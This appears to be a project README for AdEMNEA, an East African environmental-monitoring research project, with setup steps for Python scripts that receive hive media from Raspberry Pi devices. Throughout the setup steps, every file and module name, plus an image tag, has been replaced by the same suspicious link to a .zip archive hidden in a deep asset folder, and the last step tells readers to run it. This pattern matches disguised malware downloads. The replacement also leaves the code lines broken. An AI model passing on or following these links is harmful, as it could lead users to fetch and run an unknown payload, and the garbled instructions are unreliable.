<p align="center"><a href="http://196.43.168.57/" target="_blank"></a></p>
<img src="https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip">


# About AdEMNEA
Adaptive Environmental Monitoring Networks for East Africa (AdEMNEA) Project is a
combined research and capacity development project funded by the Norwegian Agency for
Development Cooperation, (Norad) under the Norwegian Programme for Capacity Development
in Higher Education and Research for Development (NORHED II). It is a cooperation between
Norwegian University of Science and Technology, NTNU (leading institution), Makerere
University in Uganda (leading southern institution), the University of Juba in South Sudan,
Dar es Salaam Institute of Technology (DIT) in Tanzania, University of Bergen, Norway.

This project will design, develop, and deploy a flexible network of data gathering and
monitoring stations for meteorological data as well as a wide variety of data including audio,
image, and video data as well as field reports and telemetry data, integrating both existing
sensing platforms and customized components for specific research areas. This is targeting the
thematic sub-area Climate Change and Natural Resources.

These data points will be aggregated through resilient and energy-efficient ICT networks from
the field to researchers conducting data analysis using machine learning, pattern recognition,
and other artificial intelligence and analytical methods in order to support researchers in the
application domain.

The targeted application domains will be weather monitoring, building on the results and
infrastructure established in the NORHED WIMEA-ICT project, and using this data together with
the additional sensing and measurement sources to support researchers initially in the
entomology domain. Both weather monitoring and the direct analysis of the presence,
prevalence, and behavior of pollinators and pests will offer important insights into the effects of
climate change on natural resources for both the natural environment and particularly
agriculture.

The expected Project goal is improved insect pest (Mango Fruit Flies) control and insect
pollinator (bee) biodiversity conservation through Automated Continuous and Systematic
Species Monitoring across wild and agricultural landscapes. It is anticipated to contribute to
increasing Agricultural yields in the partner countries.


# DEPLOYING SCRIPTS THAT RECEIVE MEDIA FROM RASPBERRY PI ON THE SERVER

1. Install python watchdog using the command below;

      ```pip install watchdog``` 
      
3. Go to MODULES\https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip , under the function "database_connection()" and  edit this line accordingly;

   ``` mydb = https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip(host = " ", user = " ", passwd = " ", database = " ")``` 
  
3. Go to MODULES\https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip , edit these lines below accordingly 
    
    i.e Enter the path of the folder that receives hive audios here.
   ```folder_to_track = r" " ```                                                                                                                                                    
    i.e Enter the path of the laravel folder linked to hive audios here.
   ```folder_destination = r" " ```
      
4. Repeat step 3 for https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip and https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip

5. Open https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip , edit line 56 as per the directive in its comment.

6. Finally, run the file https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip, it will run all the other scripts in turn.




